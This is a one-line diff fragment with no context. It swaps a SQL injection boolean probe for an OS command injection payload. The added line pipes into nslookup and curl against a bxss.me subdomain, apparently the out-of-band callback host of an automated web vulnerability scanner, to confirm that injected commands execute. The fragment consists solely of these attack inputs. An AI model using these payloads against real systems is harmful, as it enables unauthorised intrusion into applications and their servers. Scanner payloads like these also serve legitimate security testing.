@@ -1,1 +1,1 @@
--1" OR 3+493-493-1=0+0+0+1 -- 
+|(nslookup -q=cname hitwximrfrepd55add.bxss.me||curl hitwximrfrepd55add.bxss.me)
